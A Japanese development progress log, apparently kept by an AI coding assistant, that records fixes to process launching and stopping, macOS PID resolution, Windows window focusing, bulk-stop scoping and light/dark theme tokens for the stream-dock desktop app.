  `.app` 起動→単体・Preset 単位停止で実アプリ終了 / 起動後 Runtime Status が running 継続→終了で stopped /
  第三者アプリ（OBS/Discord 等）/ 既起動アプリの起動→停止（§6 限界の実挙動）/ 存在しないパス・非 .app・.bat の
  エラー / Windows・Linux 経路（004〜010）非破壊

### セキュリティ確認（docs/security.md 準拠 / 起動・停止処理変更のため security-review 必須）

- **shell 非経由**: 起動は `/usr/bin/open`（固定絶対パス・配列引数）。停止は `sysinfo` のプロセス kill
  （システムコール）で `taskkill`/`kill(1)`/`pkill`/`sh -c`/`osascript` を使わない
- **kill 対象の限定**: stream-dock が `open` した before/after 差分で同定した PID のみ registry に載せ、
  停止・状態確認の直前に **exe パス一致を再検証（PID 再利用ガード）**。プロセス名だけの kill はしない（§6）
- **process 列挙（sysinfo）**: 全プロセス列挙は「自分が起動したアプリの PID 解決」に限定した読み取り専用・
  ローカルのみ。取得情報はログ/画面に出さない・外部送信なし（§9）
- **情報漏洩**: 解決失敗・open 失敗・タイムアウト・停止失敗はすべて固定文言（`launch_failed`/「プロセスの
  停止に失敗しました」）に丸め、フルパス・OS エラーを frontend・app_logs に出さない
- frontend からは toolId/presetId のみ（任意 PID/path/command を渡せない）・capabilities/外部通信の追加なし・
  Windows/Linux 非破壊（sysinfo は macOS 限定＋cfg・`child = Some` 経路は不変）

### 既知の限界 / 残課題（今回スコープ外・据え置き）

- **§6 の緊張**: 既起動アプリの再アクティブ化時（新規 PID が出ない場合）に既存一致 PID を採用しうるため、
  ユーザーが手動起動したインスタンスを管理対象に取り込む可能性がある。security-review で妥当性を確認する
- PID 解決ポーリングによる**起動レイテンシ**（1アプリ最大 ~2 秒・一括起動は逐次で加算）。必要なら後続で最適化
- graceful shutdown（SIGTERM 猶予）・プロセスツリー全体停止・常時死活監視ループ・再起動後の復元
- git commit は未実施（指示があってから）

## 2026-07-09 (013 修正 v3: 品質レビュー指摘の是正 / Handle enum 化・遅延解決)

### 背景

013 v2 の品質レビュー（`/code-review high`）で致命1件＋改善6件を検出。ユーザー承認のもと全7件を是正した。
最重要は **Finding 1**（起動の遅い `.app` が「起動失敗」扱いになり、実際には起動したアプリが registry 未登録＝
停止不能なオーファンになる）。ユーザー選択で **深い正攻法**（registry ハンドルを `Handle` enum 化し、`open` 成功後は
PID 未同定でも登録して遅延解決）を採用した。wire（`process_id: u32`）は不変・bindings 差分ゼロを維持。

### 中核リファクタ: `Handle` enum（`registry.rs`）

- `ManagedProcess` の `process_id: u32` / `child: Option<Child>` / `exe_path: Option<PathBuf>` を単一の
  `handle: Handle` に統合。不正な組み合わせを表現不能にした:
  - `Handle::Child(Child)`（Windows/Linux/非バンドル・全プラットフォーム）
  - `#[cfg(macos)] Handle::MacResolved { pid, exe_path, start_time }`（同定済み）
  - `#[cfg(macos)] Handle::MacUnresolved { exe_dir, deadline }`（open 成功・PID 未同定＝遅延解決待ち）
- macOS 専用 variant を cfg 分岐にしたことで **非 macOS はフィールド自体が存在せず dead_code 警告ゼロ**、
  v2 にあった `stop_managed_by_pid` / `runtime_status_by_pid` の cfg フォールバック関数対と
  `spawn_app_bundle` の `unreachable!` スタブが**不要になり削除**。
- wire は `Handle::wire_pid() -> u32`（未同定は `0`＝`commands.rs` の NotFound と同じ前例）と
  `resolved_pid() -> Option<u32>`（ログ / `BulkLaunchToolResult.process_id` 用）で境界のみ導出。
- `spawn(&Tool) -> AppResult<Handle>`（v2 の `Spawned` 構造体は撤去）。`register` も `Handle` を受け取る。

### 各 Finding の是正

- **Finding 1（致命・オーファン根治）**: `launch_app_bundle` は `open` 失敗のみ `Err`。同定タイムアウト時は
  `Err` にせず `Launch::Unresolved { exe_dir, deadline }` を返し `Handle::MacUnresolved` で登録。以降の
  `snapshot` / `stop` で `exe_dir` から遅延解決する。`deadline`（`RESOLVE_GRACE = 10s`）前は楽観的に
  `Running` 表示、経過後も現れなければ `Stopped`＋reap（偽失敗を恒久ゴーストにしない）。
- **Finding 2（PID 再利用ガード強化）**: 同定時の `start_time` を保持し、`stop_by_pid` / `is_running` の
  再利用ガードを `exe 一致 && start_time 一致` に強化（同一 exe の別インスタンスへの PID 再割当を弾く）。
- **Finding 3（stop の refresh→kill レース）**: `stop_by_pid` は `kill()==false` 時にもう一度リフレッシュし、
  PID が消えていれば `None`（= already-exited）を返す。自然終了直前の停止で「停止失敗」を誤報告し
  dead エントリを registry へ再挿入する退行を解消。
- **Finding 4（一括起動レイテンシ）**: 同期ポーリング窓を `2.0s`（20×100ms）→ `~0.5s`（5×100ms）に短縮
  （タイムアウトが非致命になったため）。速いパス（before 集合で新規 PID 優先）は同期窓に残す。
  一括起動は `launch_one` 逐次のため N×窓 の線形依存は残る（スレッド化は 008 方針に反するため今回はしない）。
- **Finding 5（効率）**: ポーリングで `System` を1つ生成して使い回し（毎周回の `System::new()`＋全列挙を回避）。
  snapshot の遅延解決も **ロック外で `refresh_all()` を1回だけ**呼ぶ3フェーズ構成（重い全列挙を registry
  ロック下で回さない）。複数未同定エントリが同一 PID を取り合わないようパス横断で重複排除。
- **Finding 6（効率）**: ポーリング最終回の無駄な `sleep(100ms)` を除去。
- **Finding 7（文書化のみ・下記「既知の限界」）**: コード変更なし。

### snapshot の3フェーズ構成（ロック保持時間を増やさない）

1. **Phase A（ロック内・軽量）**: `Child::try_wait()` / `MacResolved` の単一 PID 確認を実施。`MacUnresolved` は
   `(launch_id, exe_dir, deadline)` を収集するのみ。解決済み PID は `claimed` に控える。
2. **Phase B（ロック外）**: 未同定エントリを `resolve_pending` で **1 回の全列挙**でまとめて解決。
3. **Phase C（ロック再取得）**: 解決結果を反映（`MacResolved` へ遷移／楽観 Running／deadline 超過は Stopped）し、
   終了検知分を reap。Phase A/B の間に消えたエントリは skip。

### 変更・作成した主要ファイル

- `src/process/registry.rs`: `Handle` enum・`ManagedProcess` の `handle` 化・`wire_pid`/`resolved_pid`・`RESOLVE_GRACE`
- `src/process/service.rs`: `spawn -> Handle`・`macos::Launch`/`Resolution`・`launch_app_bundle`（Unresolved 返却・
  System 使い回し・窓短縮・末尾 sleep 除去）・`stop_by_pid`（start_time ガード＋kill レース）・`is_running`/`stop_unresolved`/
  `resolve_pending`・`stop_one`（Handle match）・`snapshot`（3フェーズ）・`build_runtime` ヘルパ
- `src/process/commands.rs`: `launch_tool`（未同定時は pid ログを省く）
- 触っていない: `process/model.rs`・型 bindings（**wire 不変**）・`Cargo.toml`（sysinfo 0.39 のまま）・
  `capabilities`・DB・React 側・Windows/Linux 経路（`Handle::Child` 一択で挙動不変）

### 検証結果

- `cargo check` / `cargo clippy` 成功（**warning 0**）
- `cargo test export_bindings` 成功（**24 tests** ok）→ **bindings 差分ゼロ**（wire 不変）
- `pnpm typecheck` / `pnpm lint` 成功
- 事前検証: sysinfo 0.39.5 の単一 PID リフレッシュでも `start_time` が取得される（`pbi_start_tvsec` 由来で
  `ProcessRefreshKind` に非依存）ことをクレートソースで確認済み（Finding 2 ガードの前提）
- ※ 非 macOS ビルドは当環境（darwin）で実行不可。macOS 専用コードが `#[cfg(target_os = "macos")]` に
  漏れなく閉じ、非 macOS では `Handle` が `Child` 一択で dead_code が出ないことをコードレビューで担保
- ※ 実機 E2E（macOS・ユーザー環境）で確認予定: 起動の遅い/大型 `.app` を起動 → 「起動失敗」にならず少し後に
  Running で現れ停止できる（オーファンなし）／ 同一 exe の別インスタンスへ PID 再利用されても他人のアプリを
  kill しない ／ 自然終了しかけの停止で「停止失敗」誤報告が出ない ／ 起動済み `.app` 複数のプリセット一括起動の体感改善

### 既知の限界 / 残課題（今回スコープ外・据え置き）

- **Finding 7（複数バイナリ `.app`）**: `same_macos_dir` は `Info.plist` の `CFBundleExecutable` ではなく
  「exe の親が `<bundle>/Contents/MacOS`」の全プロセスに一致する。`Contents/MacOS` 直下に**複数のフラット
  バイナリ**を持つ `.app`（ランチャスタブ＋本体等）では、本体以外の PID を同定・停止しうる（低頻度・アプリ依存）。
  Info.plist を読むと撤去済みの `plist` クレート再導入が必要なため、**既知の限界として据え置く**。
  ネストした `.app`（Electron/Chromium 系）は自分の内側 `Contents/MacOS` が exe 親のため非該当。
- **§6 の緊張（v2 から継続）**: 既起動アプリの再アクティブ化（新規 PID が出ない）や遅延解決時に、ユーザーが
  手動起動したインスタンスを管理対象に取り込む可能性。security-review で妥当性を確認する。
- **一括起動レイテンシ**: 窓短縮で軽減したが `launch_one` 逐次のため線形依存は残る（スレッド化は 008 方針外）。
- graceful shutdown（SIGTERM 猶予）・プロセスツリー全体停止・常時死活監視ループ・再起動後の復元
- git commit は未実施（指示があってから）

## 2026-07-09 (013 レビュー指摘 #1 の是正: MacUnresolved 停止の deadline 尊重)

### 直した問題

品質レビューで、`Handle::MacUnresolved`（`open` 成功だが実プロセスがまだプロセステーブルに現れていない
＝コールドスタート中）に対する停止が、`deadline` を見ずに一律「既終了（already-exited）」と判定して registry
から**エントリを破棄**していた。結果、実プロセス未出現の窓で停止すると、その後に起動したアプリが stream-dock
の管理外で動き続け、以降 停止も 010 状態表示も効かなくなる（`snapshot` 側は `deadline` を尊重して
StillPending 据え置きにしているのに、停止側だけ非対称だった）。

### 変更（`src/process/service.rs` のみ）

- `macos::stop_unresolved` の戻り値を `Option<bool>` → **`UnresolvedStop { Killed(pid) / SendFailed / Gone / NotAppeared }`**
  へ変更。「一致プロセスが列挙に無い（まだ現れていない）＝ `NotAppeared`」を、`stop_by_pid` の `None`
  （同定直後に消えた/再利用＝ `Gone`）と区別できるようにした。
- `stop_one` の `MacUnresolved` 分岐で `deadline` を尊重:
  - `Killed` → `stopped`（同定した実 PID を停止結果へ反映＝レビュー指摘 #6 も是正。従来は pid 0 表示）
  - `SendFailed` → `failed`（ハンドルを戻して再試行可能に）
  - `Gone` → `already-exited`
  - `NotAppeared` → `deadline` 前なら `failed` ＋ **ハンドルを registry へ戻し**、アプリ出現後の再 stop で kill
    できるようにする（snapshot の StillPending と対称）。`deadline` 超過は「起動しなかった」扱いで `already-exited`。
- `StopStatus` / `StopProcessResult` / bindings / 起動処理 / Windows・Linux 経路（`Handle::Child`）は**不変**。

### 検証結果

- `cargo check` **warning 0** / `cargo test export_bindings` **24 tests ok**・**bindings 差分ゼロ**
- `pnpm typecheck` / `pnpm lint` 成功
- 停止判定ロジックの変更のため security-review を再実施予定（013 方針）
- 実機 E2E（macOS）で確認予定: 起動の遅い `.app` を起動 → 実プロセス出現前に停止 →「起動処理中…」の
  `failed` でエントリが残り、出現後の再停止で `stopped` になること（オーファンが残らないこと）

## 2026-07-09 (メイン画面バグ修正 ＋ 全プラットフォーム前面化)

### 今回完了したこと

ユーザー報告のメイン画面バグ7件を調査・修正した（macOS で確認、Windows でも発生しうるもの）。加えて、
当初 MVP で許容としていた「開く」の Windows/Linux 二重起動の縮退を、別対応で根絶した（launchId ベースの
既存ウィンドウ前面化へ設計変更）。

- **バグ1: 「開く」が動作しない → 全プラットフォームで既存ウィンドウを前面化（新規起動しない）**
  - 当初は死にボタン（`onClick` 未配線）。まず `focus_tool(toolId)` を新設したが、Windows/Linux は
    `spawn` フォールバックで**二重起動**する縮退があった。これを是正し、**`focus_process(launchId)`**
    に設計変更。frontend は launchId のみ渡し、Rust が registry から実 PID / Tool を解決して前面化する
    （`stop_process` と同じ設計。**新規インスタンスは絶対に起動しない**）。
    - Windows: 保持 PID とその**子プロセスツリー**（`CreateToolhelp32Snapshot` で親子関係を辿る）から
      トップレベルウィンドウ（可視・オーナー無し・タイトル有り）を `EnumWindows` で特定し、最小化なら
      `SW_RESTORE`、`SetForegroundWindow` のフォアグラウンド制限は `AttachThreadInput` 系の回避で前面化。
    - macOS `.app`: `/usr/bin/open <bundle>`（LaunchServices が既存を前面化・新規起動しない）。
    - Linux / 非バンドル: アクティブ化は非対応（no-op）。ただし二重起動はしない（`spawn` フォールバック廃止）。
- **バグ2: 画面遷移でステータスが「待機中」に戻る（単体起動）** → `launch_tool` に `preset_item_id` 引数を
  追加し、単体起動プロセスも registry に presetItemId を記録。再マウント時の `reconcile(true)` が既存の
  `byPresetItemId` 経路で「起動済み」を復元する（一括起動と同じ復元経路）。preset_id は None のまま
  （一括停止のスコープは不変）。wire 不変・bindings 差分ゼロ。
- **バグ3: インフォメーションの位置** → `launchFeedback` バナーを「起動順」見出しの**上**へ移動（従来は
  起動順とアプリ一覧の間に割り込んで連続カードの seam を割っていた）。margin を調整。
- **バグ4: ツール0件でも「＋ プリセットを追加」が押せる** → `disabled={!hasTools}` ＋ `.ghost:disabled`
  スタイル ＋ ヒント文を追加。
- **バグ5: 空状態が上寄せ** → `.emptyState` を `min-height: 320px` → `min-height: 100%`（box-sizing:
  border-box）にし、`.main` の高さいっぱいで上下左右中央寄せ。
- **バグ6/7: 空状態の文言・遷移ボタン欠如** → `presetName === null` の空状態を `hasAnyTools` で分岐。
  ツール0件は「まだツールがありません」＋「＋ ツールを登録」（add-tool へ遷移）、ツールあり・プリセット
  0件は「まだプリセットがありません」＋「＋ プリセットを追加」（add-preset へ遷移）。App から
  `onNavigate` / `hasAnyTools` を配布。

### 追加ライブラリ（理由）

- `windows`（0.58・**Windows 限定ターゲット依存** `[target.'cfg(windows)'.dependencies]`）: 既存ウィンドウの
  前面化（`EnumWindows` / `SetForegroundWindow` / `ShowWindow` / `CreateToolhelp32Snapshot` 等）に必要。
  features は `Win32_Foundation` / `Win32_UI_WindowsAndMessaging` / `Win32_System_Threading` /
  `Win32_System_Diagnostics_ToolHelp` に限定。macOS/Linux ビルドには載せない（sysinfo の macOS 限定と同じ扱い）。
  用途は「自分が起動した PID のウィンドウ前面化」に限定・外部通信なし。

### 変更した主要ファイル

- Rust（`apps/desktop/src-tauri/`）:
  - `src/process/service.rs` — 検証を `validate_executable()` に抽出（spawn/focus 共通）・`focus(pid, tool)`
    新設（macOS `open` / Windows `windows::focus_by_pid` / Linux no-op）・`#[cfg(windows)] mod windows`
    （プロセスツリー探索＋ウィンドウ前面化）
  - `src/process/commands.rs` — `focus_process(launch_id)` 追加（registry から PID/Tool 解決）・`launch_tool` に
    `preset_item_id` 引数追加し register へ
  - `src/lib.rs` — handler に `focus_process` 登録
  - `Cargo.toml` — `windows` を Windows 限定で追加（`Cargo.lock` 更新）
- Frontend（`apps/desktop/src/`）:
  - `features/tools/toolApi.ts` — `focusProcess(launchId)` 追加・`launchTool(id, presetItemId?)` 拡張
  - `screens/main/ToolRow.tsx` — 「開く」に `onOpen` 配線
  - `screens/main/MainScreen.tsx` — `handleOpen(launchId)`・単体起動で presetItemId 送信・バナー移動・
    空状態分岐＋遷移ボタン・props（`onNavigate` / `hasAnyTools`）追加
  - `screens/main/MainScreen.module.css` — バナー margin・`.emptyState` 100%・`.emptyAction` ボタン
  - `components/Sidebar.tsx` / `Sidebar.module.css` — プリセット追加ボタン非活性化＋ヒント＋`.ghost:disabled`
  - `App.tsx` — MainScreen へ `onNavigate` / `hasAnyTools` を配布
- bindings（ts-rs）・DB スキーマ・capabilities: 変更なし（focus は `()` 返却・launch の wire 不変）

### まだ未完了のこと

- **security-review 未実施**（プロセス操作の追加＝`focus_process` と Windows ウィンドウ前面化、
  `windows` クレート・起動 command の引数追加が対象。`docs/security.md` レビュー必須条件に該当）。
- **実機 E2E 未実施**（GUI 表示が必要）。特に **Windows 実機での「起動→背面化→開くで既存を前面化・二重起動
  しない」** の確認が最重要。macOS の前面化・バグ2〜7 も未確認。手順はチャットで提示済み。
- **Windows / Linux ビルドの未検証**：当環境（darwin）では `#[cfg(windows)] mod windows` と `windows`
  クレートがコンパイルされないため、Windows コードは静的検査で通っていない（下記「既知のエラー」参照）。
- git commit は未実施（指示があってから）。

### 次にやるべきタスク

1. `docs/security.md` 準拠の **security-review**（`focus_process` / Windows 前面化 / `windows` クレート /
   registry の PID 利用範囲＝stream-dock 起動プロセスに限定されているか）。
2. **Windows 実機ビルド＆E2E**（`cargo check`/`clippy` を Windows で通す・二重起動しないことの確認）。
3. macOS 実機 E2E（バグ1〜7）。
4. 問題なければ commit。

### 既知のエラー

- なし（macOS 上の静的検査はすべてクリーン）。
- **注意（未検証領域）**: `#[cfg(windows)] mod windows` と `windows` クレートは darwin ではコンパイル対象外の
  ため、`cargo check`/`clippy` では検証されていない。Windows ビルドで初めて型・API 使用が検査される。

### 実行した確認コマンド（すべて macOS 上・成功）

- `cargo check` → 成功（warning 0）
- `cargo clippy` → 成功（warning 0）
- `cargo test --lib export_bindings` → **24 tests ok**・**bindings 差分ゼロ**（wire 不変の証跡）
- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）→ 成功（63 modules）
- ※ `pnpm tauri dev` の GUI 実機 E2E は表示環境が必要なため未実施

### 次回セッションで最初に読むべきファイル

1. `docs/progress.md`（この節）
2. `CLAUDE.md`（開発ルール・検証コマンド）/ `docs/security.md`（前面化＝プロセス操作のレビュー基準）
3. `apps/desktop/src-tauri/src/process/service.rs`（`focus` / `#[cfg(windows)] mod windows`）
4. `apps/desktop/src-tauri/src/process/commands.rs`（`focus_process` / `launch_tool` の presetItemId）
5. `apps/desktop/src/screens/main/MainScreen.tsx`（`handleOpen` / reconcile / 空状態分岐）・
   `apps/desktop/src/features/tools/toolApi.ts`（`focusProcess` / `launchTool`）

## 2026-07-09 (014 Bulk Stop for Individual Launches)

### 今回完了したこと

プリセットのメイン画面で**個別起動**したツールを「一括停止」で止められない不具合を解消した。

- **根本原因**: `process/commands.rs` の `launch_tool` が単体起動時に
  `service::register(..., None, preset_item_id, ...)` として **`preset_id = None` で登録**していた。
  一方 `stop_preset_processes` は registry を `mp.preset_id.as_deref() == Some(preset_id)` で絞り込むため、
  `preset_id = None` の個別起動プロセスは一括停止の対象に一切入らなかった。メイン画面の個別起動は
  `preset_item_id`（= preset_items.id）を渡しており所属プリセットは特定可能なのに、その情報が
  `preset_id` へ反映されていないだけだった。

- **変更内容（`launch_tool` 一箇所に閉じる）**: Tool 取得と**同じ DB ロックスコープ内**で、
  `preset_item_id` が `Some` のとき `preset_items::repository::get` により所属 `preset_id` を解決し、
  `service::register(..., resolved_preset_id, preset_item_id, ...)` で registry に確定保存するようにした。
  - 該当 preset_item が無い / DB エラーのときは `.ok().flatten()` で `preset_id = None` に**フォールバックし、
    起動自体は失敗させない**（`preset_item_id` を無条件に信用せず、存在確認したうえで解決）。
  - `preset_item_id` の無い個別起動（サイドバー等・プリセット文脈なし）は従来どおり `preset_id = None` で
    一括停止の対象外。
  - `launch_tool` の doc コメント（旧「preset_id は None のまま」）を実態に合わせて更新した。

- **変更が `launch_tool` に閉じている**: `stop_preset_processes` のフィルタロジック・`service::register`
  （既に `preset_id: Option<String>` を受け取る）・registry・013 の macOS `.app` 起動/停止経路はいずれも無改修。
  `git diff --name-only` は `commands.rs` 1ファイルのみ（+26 / -7）。停止側の DB 往復は増やしていない。

### セキュリティ確認（security-review 実施済み）

`docs/security.md`（§6 プロセス停止 / §8 入力検証）に基づき security-review を実施。**問題なし**。

- 停止対象は依然 registry 登録の stream-dock 起動プロセスのみ。スコープの拡大は「プリセット文脈で個別起動した
  registry 内プロセス」に限られ、外部プロセス・手動起動プロセスの取り込みは増えていない（§6）。
- frontend から渡るのは `toolId` / `presetItemId` のみで、`preset_id` は Rust 側で DB から導出。任意 PID /
  path / 任意 preset_id を停止に渡せる経路は生まれていない。偽装 `preset_item_id` は `repository::get` の
  実在確認で弾かれ `None` フォールバックとなる（§8）。
- shell 非経由（`taskkill`/`kill`/`pkill` 追加なし）。008/009/013 の停止経路は不変。Tauri capabilities・
  外部通信・CSP・依存関係は変更なし。DB ロックは spawn/kill 中に保持しない従来設計を維持。

### 実行した確認コマンド（すべて macOS 上・成功）

- `cargo check` → 成功（warning 0）
- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）→ 成功（63 modules）

### 未完了事項

- **実機 E2E 未実施**（ユーザー環境）: プリセット画面で複数個別起動 →「一括停止」で実停止 /
  008 由来の停止が退行しない / サイドバー個別起動は一括停止の対象外 / 所属 preset_item を解決できない
  ケース（削除済み等）でも起動は失敗しない。
- git commit は未実施（指示があってから）。

---

## 2026-07-10 (015 Design Tokens & Color Unification)

### 完了したこと

- 配色を **役割ベースのデザイントークン（CSS 変数）** に集約し、「配色がダサい・見にくい」「ボタン等の色が不統一」を解消。ダーク単色のまま洗練し、色のハードコードをトークンへ寄せた（ライト/ダーク切替・OS 検知・設定は 016 の範囲、015 はその土台）。
- **パレット**: CastDock A案 Clean Dock の `.dark` 値を唯一のパレットとして採用。`.dark`/`prefers-color-scheme` を使う箇所は現状ゼロのため、`.dark` の hex を **`:root` の seed 変数**（`--color-*`）として配置（トグル機構は 016 で追加）。
- **9 個の `*.module.css` の生 hex/rgba（計 192 箇所）を全廃**し、すべて `var(--...)` 参照に置換（grep で 0 件確認）。

### 採用したトークン体系（`apps/desktop/src/styles/theme.css`）

- seed（パレット）: `--color-background #090D18` / `--color-surface #111827` / `--color-surface-elevated #1B2435` / `--color-border #2D3748` / `--color-text #F9FAFB` / `--color-text-muted #9CA3AF` / `--color-text-inverse #090D18` / `--color-primary #2F6BFF` / `--color-secondary #22D3EE` / `--color-accent #A78BFA` / `--color-info #60A5FA` / `--color-success #4ADE80` / `--color-warning #FBBF24` / `--color-error #F87171`
- 役割トークン（既存 `--bg`/`--text`/`--muted`/`--line`/`--accent`/`--accent-2`/`--ok`/`--warn`/`--danger`/`--radius` は温存し値を seed 参照へ更新）:
  - 表面: `--surface` / `--surface-2` / `--surface-hover` / `--surface-subtle` / `--control-bg` / `--control-bg-hover`
  - 境界: `--line` / `--border-soft`
  - 文字: `--text` / `--muted` / `--text-faint` / `--text-inverse` / `--muted-soft` / `--muted-border`
  - アクセント: `--accent`(secondary cyan) / `--accent-2`(purple) / `--accent-soft` / `--accent-soft-border` / `--accent-text`
  - primary（**新規** CTA/選択/フォーカス）: `--primary` / `--primary-soft` / `--primary-soft-border` / `--primary-text`
  - ステータス: `--ok`/`--warn`/`--danger`/`--info` と各 `*-soft` / `*-border`（+ `--warn-border-strong` / `--danger-border-strong` / `--danger-focus` / `--*-text`）
  - ボタン/elevation: `--btn-primary-bg`(secondary↔accent グラデ) / `--btn-primary-fg` / `--shadow-drop` / `--btn-ghost-bg` / `--btn-ghost-border` / `--elev-gradient` / `--elev-border` / `--shadow-1` / `--shadow-inset` / `--overlay-scrollbar` / `--spinner-track`

### パレットのマッピング（役割 → seed）

- 背景=background / カード・パネル=surface / toolbar・panelHead・footer・emptyState=surface-elevated / 標準境界=border / 文字=text・text-muted。
- **primary #2F6BFF は CTA/選択/フォーカスに限定**（広面積禁止）: 選択中プリセット・アクティブ step・選択済みツール・編集トグル ON・空状態 CTA・チェックボックス accent-color を primary 系へ統一。
- secondary #22D3EE（`--accent`）と accent #A78BFA（`--accent-2`）は装飾アクセント（IconTile・parallel バッジ・dropzone・appIcon・previewName・newRow 等）に限定。
- info/success/warning/error → info/ok/warn/danger バッジ・バナー・入力エラー。

### 派生色（color-mix・新基準色は追加せず）

- hover 面 / 弱い境界 / 半透明 white オーバーレイ（input・ghost・chip・elevation グラデ）
- placeholder（muted 72%）/ accent 上の淡色文字 / danger・info・warn の淡色文字
- 各ステータスの弱背景・弱境界 / accent 弱背景・弱境界 / 影・inset ハイライト・scrollbar
- 装飾用ラジアルグロー（startBtn / appIcon / dropzone / toolOption.selected / newRow）は `color-mix(in srgb, var(--accent|--primary) N%, transparent)` で表現

### 設計判断（ユーザー確認済み）

1. プライマリボタンのグラデ両端 → **secondary↔accent（#22D3EE↔#A78BFA）**（現 cyan→purple の雰囲気を継承）
2. 選択・CTA の色 → **primary 青 #2F6BFF に寄せる**（cyan は装飾アクセント限定）
3. パネル/サイドバー等の表面 → **ソリッドに集約**（半透明レイヤー廃止、sidebar/main は `--bg`）

### 置換範囲（生 hex/rgba → var）

- `MainScreen`(51) / `primitives`(31) / `AddPreset`(31) / `Sidebar`(22) / `AddTool`(18) / `Diagnostics`(17) / `formLayout`(12) / `PreviewCard`(9) / `Window`(1) = 192 箇所すべて。

### 検証結果

- `grep -riE '#[0-9a-f]{3,8}\b|rgba?\(' --include=*.module.css` → **0 件**（module.css は完全にトークン参照のみ）
- `pnpm --filter ./apps/desktop typecheck` → 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` → 成功（exit 0）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）→ 成功（63 modules、CSS 26.11 kB）
- **実機表示（`tauri dev`）は未実施**: 全画面（メイン/ツール追加/プリセット追加/診断/サイドバー/プレビュー）の視覚破綻なしはユーザー環境で確認をお願いしたい。

### やっていないこと（スコープ外）

- ライト/ダーク切替・OS 検知・設定画面（016）/ レイアウト・props/API・文言・アイコン方式の変更 / 新ライブラリ・外部リソース追加なし（§CSP 準拠）。

## 2026-07-10 (016 Light/Dark Theme + Settings)

### 完了したこと

- **ライト値セット**と**テーマ切替（システム / ライト / ダーク）**を追加。既定は OS 設定に追従し、**設定画面**で明示選択・永続化できるようにした（ユーザー要望 4）。015 のトークン体系を土台にライト seed とスイッチ機構を載せただけで、配色トークン自体の再設計はしていない。
- サイドバーに「⚙ 設定」ナビを追加（diagnostics パターン踏襲）。設定画面でテーマ 3 択が**即時反映**、localStorage で**再起動後も保持**、「システム」時は CSS の `prefers-color-scheme` が **OS 変更へライブ追従**。

### テーマ切替の実装方式（frontend のみ / 外部通信なし）

- **CSS（`src/styles/theme.css`）**: seed の `--color-*` をテーマごとに差し替えると、役割トークンは color-mix 派生なのでほぼ全て自動追従する（015 の設計を利用）。
  - 既存 `:root`（015=ダーク）は**丸ごと温存**し「既定」兼「OS ダーク時のシステム追従」を兼ねる（media-dark は :root と重複するため置かない）。
  - `:root[data-theme="dark"]`（明示ダーク・値は 015 と同一）/ `:root[data-theme="light"]`（明示ライト）/ `@media (prefers-color-scheme: light) { :root:not([data-theme]) }`（システム時 OS ライト）を追加。
  - 切替の勝ち負け: システム→ダークは `data-theme="dark"` で base(dark) 適用＆media-light を `:not([data-theme])` で無効化。システム→ライトは `[data-theme="light"]`(0,2,0) が `:root`(0,1,0) に勝つ。両方向でトグルが勝つことを確認。
- **状態/永続化**: `ThemePreference = "system" | "light" | "dark"`（既定 `system`）。localStorage キー **`stream-dock.theme`（1 個）**、不正値・例外は `system` にフォールバック（`features/theme/theme.ts`）。
- **反映**: `document.documentElement` に `system`→`removeAttribute("data-theme")` / `light|dark`→`setAttribute`。`useTheme()` フックが保存＋DOM反映を担い、App.tsx から SettingsScreen へ props で渡す。
- **FOUC 防止**: `main.tsx` で React render 前に `applyThemePreference(loadThemePreference())` を同期適用。
- **matchMedia 監視は不採用**: 「システム」時は data-theme 未設定で CSS の media が OS 変更へ自動追従するため、JS 側の監視は不要（任意項目）。

### ライト値マッピング（seed = CastDock A案 パレット `:root`）

| 役割 seed                        | ライト                                        | ダーク(015=パレット.dark)                     |
| -------------------------------- | --------------------------------------------- | --------------------------------------------- |
| primary                          | `#0036CB`                                     | `#2F6BFF`                                     |
| secondary                        | `#00A3B5`                                     | `#22D3EE`                                     |
| accent                           | `#7C3AED`                                     | `#A78BFA`                                     |
| background                       | `#F7F8FA`                                     | `#090D18`                                     |
| surface                          | `#FFFFFF`                                     | `#111827`                                     |
| surface-elevated                 | `#EEF2F7`                                     | `#1B2435`                                     |
| text                             | `#111827`                                     | `#F9FAFB`                                     |
| text-muted                       | `#6B7280`                                     | `#9CA3AF`                                     |
| text-inverse                     | `#FFFFFF`                                     | `#090D18`                                     |
| border                           | `#D7DEE8`                                     | `#2D3748`                                     |
| info / success / warning / error | `#2563EB` / `#16A34A` / `#F59E0B` / `#DC2626` | `#60A5FA` / `#4ADE80` / `#FBBF24` / `#F87171` |

- **015 のダーク seed はパレット `.dark` と完全一致**（齟齬なし・勝手な変更なし）。

### ライトで個別上書きした「ダーク前提の派生」（新色は足さない）

1. `-text` 系（015 は `mix(色, #fff)` で暗い面用の明るい文字を作る）を、ライトでは **mix 先を `var(--color-text)`(=#111827)** に再導出: `--accent-text` / `--primary-text` / `--warn-text` / `--danger-text` / `--info-text`（白地の淡いソフト背景に暗い文字が載るように）。
2. `--btn-primary-fg`（base=`var(--text)`）は、ライトの CTA グラデ（teal→purple）で暗い文字が判読不能になるため **`var(--color-text-inverse)`(=#FFFFFF)** に上書き。

- いずれも**パレット既存色のみ**を使用。新たな基準色の追加は無し。

### 派生色の判断（ユーザー確認済み）

- `--elev-gradient`（一括停止ボタン背景 & カード面。`mix(text 10%→5%, transparent)`）: ライトでは「白地に薄いグレーのティント」に自動追従しコントラストは保たれる → **そのまま自動追従で採用**（ライト個別上書きなし・新色ゼロ・最小変更）。
- 影（`--shadow-1` = 黒 12%）は白地でも標準的に成立するため**維持**。
- 相談が必要な不足色は**無し**（すべてパレット既存色＋派生で表現可能）。

### 作成・変更ファイル

- 変更: `styles/theme.css`（テーマブロック追加・既存 :root 温存）/ `types.ts`（`Screen` に `"settings"`）/ `main.tsx`（初期適用）/ `App.tsx`（`useTheme` 配線・設定画面描画）/ `components/Sidebar.tsx`（設定ナビ・`activeNav` 型拡張）/ `components/Sidebar.module.css`（隣接 ghost ナビの間隔）。
- 新規: `features/theme/theme.ts` / `features/theme/useTheme.ts` / `screens/settings/SettingsScreen.tsx` / `screens/settings/SettingsScreen.module.css`（トークン参照のみ）。

### 検証結果

- `grep -rnE '#[0-9a-fA-F]{3,8}|rgba?\(' --include=*.module.css`（`var(--` 除外）→ **0 件**（新規 CSS も含めトークン参照のみ）。
